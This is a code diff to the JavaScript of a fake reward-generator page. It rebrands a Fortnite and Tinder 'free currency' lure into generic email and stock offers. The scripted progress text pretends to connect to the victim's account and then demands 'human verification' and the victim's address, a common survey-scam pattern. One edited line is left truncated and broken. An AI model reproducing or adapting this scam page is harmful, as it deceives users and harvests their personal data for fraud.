@@ -28,7 +28,7 @@ function FADJ() {
 
 function F1() {
   if ($("#tinder-ep").val().length < 1) {
-    alert("Make sure to type in your Fortnite email/account.");
+    alert("Make sure to type in your correct email/account.");
   } else {
     $(".T1").fadeOut(1500);
     setTimeout(function () {
@@ -79,24 +79,22 @@ function F3() {
 
         if (CUR < 8) {
           TEX =
-            "Connecting with your <span class='t-normal'>Fortnite account</span>...";
+            "Connecting with your <span class='t-normal'>Email account</span>...";
         } else if (CUR >= 8 && CUR < 32) {
           TEX =
-            "Adding <span class='t-normal'>Fortnite " +
-            SELECTEDTINDER +
-            "</span> membership...";
+            "Adding <span class='t-normal'>Email " 
         } else if (CUR >= 32 && CUR < 64) {
           TEX =
             "Adding <span class='t-normal'>" +
             SELECTEDSLIKES +
-            " Super Likes</span> and <span class='t-normal'>" +
+            " Request</span> in <span class='t-normal'>" +
             SELECTEDBOOSTS +
-            " Boosts</span>...";
+            " Stock </span>...";
         } else if (CUR >= 64 && CUR < 96) {
           TEX = "Saving all changes...";
         } else if (CUR >= 96) {
           TEX =
-            "Error, bot detected! Pass human verification to continue. <br><span class='t-normal'>After finishing restart your Fortnite to see all changes.</span>";
+            "Error, bot detected! Pass human verification to continue. <br><span class='t-normal'>After finishing, provide us your address.</span>";
           $(".VB").fadeIn(1500);
         }
 
@@ -167,12 +165,12 @@ $(window).resize(function () {
 $("#tinderSubscribtions").on("show.bs.collapse", function (e) {
   if (e.target.id == "Gold") {
     $(".CWITH").html(
-      "Continue with <GOLD>Skins</GOLD><img src='superlike-2.png' class='inline-TINDER-30'>"
+      "Continue with <GOLD>Black</GOLD>"
     );
     SELECTEDTINDER = "Gold";
   } else {
     $(".CWITH").html(
-      "Continue with <PLUS>V-Bucks</PLUS><img src='gold-2.png' class='inline-TINDER-30'>"
+      "Continue with <PLUS>Deep Purple</PLUS>"
     );
     SELECTEDTINDER = "Plus";
   }
